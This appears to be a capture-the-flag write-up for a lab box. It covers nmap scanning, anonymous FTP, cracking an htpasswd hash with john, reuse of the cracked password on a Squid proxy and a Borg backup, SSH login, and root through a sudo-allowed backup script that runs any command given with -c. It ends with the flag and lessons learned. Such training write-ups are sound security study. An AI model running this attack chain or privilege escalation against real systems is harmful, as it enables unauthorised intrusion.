1. Reconnaissance

Target IP: 10.201.126.210

Nmap Scan
nmap -sC -sV -p- 10.201.126.210


Findings:

21/tcp (FTP) ‚Üí Anonymous login allowed.

80/tcp (HTTP) ‚Üí Webpage with hint about Squid proxy and inline CSS clue.

22/tcp (SSH) ‚Üí Open, but credentials unknown at this point.

2. Enumeration
FTP

Logged in anonymously.

Found a note (note_to_jake.txt) indicating weak passwords.

Recovered a .htpasswd-style hash:

music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.


Cracked it with john and rockyou.txt:

music_archive : squidward

Web Enumeration

Squid proxy credentials (music_archive:squidward) worked.

Able to browse and eventually download archive.tar.

3. Exploitation
BorgBackup Repository

Extracted archive.tar:

tar -xf archive.tar


Found a Borg repo at home/home/field/dev/final_archive/.

Used Borg to list archives:

borg list ~/Downloads/home/home/field/dev/final_archive


Unlocked with passphrase squidward.

Extracted contents:

borg extract ~/Downloads/home/home/field/dev/final_archive::music_archive


Found secret.txt on Alex‚Äôs Desktop, confirming access to sensitive data.

SSH Access

Credentials found during enumeration allowed login as alex:

ssh alex@10.201.126.210

4. Privilege Escalation

Checked sudo permissions:

sudo -l


Output:

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

Vulnerable Script

/etc/mp3backups/backup.sh contained a getopts function that accepted a -c flag to execute arbitrary commands:

while getopts c: flag
do
  case "${flag}" in
    c) command=${OPTARG};;
  esac
done

cmd=$($command)
echo $cmd

Exploit

Ran:

sudo /etc/mp3backups/backup.sh -c "/bin/bash"


Got a root shell.

5. Proof

Inside /root/:

cat /root/root.txt


Flag:

flag{Than5s_f0r_play1ng_H0p¬£_y0u_enJ053d}

6. Lessons Learned

Weak passwords (squidward) make lateral movement trivial.

Exposed BorgBackup repositories leak sensitive data.

Misconfigured sudo scripts (like backup.sh with arbitrary -c) result in full system compromise.
